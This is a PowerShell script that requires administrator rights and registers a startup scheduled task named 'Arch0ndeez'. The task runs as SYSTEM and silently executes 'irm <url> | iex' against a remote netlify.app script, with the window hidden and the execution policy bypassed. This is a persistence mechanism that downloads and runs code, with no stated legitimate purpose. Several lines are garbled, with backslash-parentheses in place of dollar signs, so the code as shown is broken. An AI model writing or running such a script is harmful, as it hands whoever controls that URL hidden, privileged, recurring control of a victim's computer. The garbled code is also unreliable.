# Define your variables here
$TaskName = "Arch0ndeez"
$ScriptUrl = "https://ahmadsan.netlify.app/SetExt.ps1"

# 1. Check for Administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Administrator rights required! Please right-click and 'Run as administrator'."
    Read-Host "Press Enter to exit"
    Exit
}

Write-Host "Setting up scheduled task: $TaskName..."

# 2. Clean up the existing task to prevent duplication errors
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host "Found existing task. Updating it..."
    Unregister-ScheduledTask -TaskName \(TaskName -Confirm:\)false
}

# 3. Create the new scheduled task parameters
\(action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm\)ScriptUrl | iex`""
$trigger = New-ScheduledTaskTrigger -AtStartup

# 4. Register the task to run as the SYSTEM account
Register-ScheduledTask -TaskName \(TaskName -Action\)action -Trigger$trigger -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force

Write-Host "Success! The task '$TaskName' is now active and will run on startup." -ForegroundColor Green
Read-Host "Press Enter to close"